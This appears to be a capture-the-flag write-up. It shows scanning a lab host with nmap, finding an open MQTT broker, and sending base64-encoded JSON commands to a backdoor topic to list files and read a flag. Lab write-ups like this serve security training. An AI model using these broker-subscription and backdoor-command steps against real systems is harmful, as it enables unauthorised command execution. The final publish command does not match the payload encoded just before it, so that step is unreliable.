IP address 10.10.59.207

#nmap #mosquitto #base64


# Nmap
```bash
nmap -sC -sV 10.10.59.207 -T5
```
![Pasted image 20240610203505](https://github.com/BGhoster/Write-Ups/assets/43526966/ca00651b-e738-4135-862a-666c2e472450)

All standard ports are filtered with the Nmap scan. Switching to scanning all ports to see which ones are open.
```bash
nmap -p- 10.10.59.207
```

### open ports
- 1883 (mqtt)

![Pasted image 20240610204254](https://github.com/BGhoster/Write-Ups/assets/43526966/e99838e9-9f23-4bf9-ae6d-7cbe9a895adc)


# What is mosquitto

> [!NOTE]
> The MQTT protocol provides a lightweight method of carrying out messaging using a publish/subscribe model. This makes it suitable for Internet of Things messaging such as with low power sensors or mobile devices such as phones, embedded computers or microcontrollers.
> https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
![Pasted image 20240610213041](https://github.com/BGhoster/Write-Ups/assets/43526966/5096de07-30e5-4182-9d96-0470ca088db7)

## Commands we will need

| Commands      | Descriptions                                               |
| ------------- | ---------------------------------------------------------- |
| mosquitto_sub | command line utility for subscribing to topics on a broker |
| mosquitto_pub | command line utility for publishing messages to a broker   |

## Installing the software

```bash
sudo apt-get install mosquitto mosquitto-clients
```

## Subscribing to all groups
```bash
mosquitto_sub -t "#" -h 10.10.59.207
```

## Decoding initial message
After some time, we see a long Base64 string that does not match everything else being logged. Decoding the Base64 shows us what is publishing the suspicious things.
![[Pasted image 20240610205607.png]]

## Publishing a message
```bash
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "test"
```

Publishing a message with a test message returns a base64-encoded string. Decoding the string reveals that the test is an invalid command. Let's fix the issue and try again.

```python
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```
![Pasted image 20240610211410](https://github.com/BGhoster/Write-Ups/assets/43526966/fe7caf38-5323-4335-bc45-e03c112c5538)

## Formatting the command
After fixing the issue, we need to encode this command in base64.
```python
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```
```python
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
```
![Pasted image 20240610211931](https://github.com/BGhoster/Write-Ups/assets/43526966/66ab2cca-635f-4f0a-ba72-ba33063f243a)

## Catting the flag
Now that we see the flag filename let's cat the flag. We will follow the same format. Change the command to cat flag.txt, base64 encode the message, and publish it.
```bash
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```
```python
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
```
```bash
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo="
```

![Pasted image 20240610212131](https://github.com/BGhoster/Write-Ups/assets/43526966/274e3ee7-25ec-46c0-a1b4-df43ad76b920)

# Resources
https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto
https://www.eginnovations.com/documentation/Mosquitto-MQTT/What-is-Mosquitto-MQTT.htm
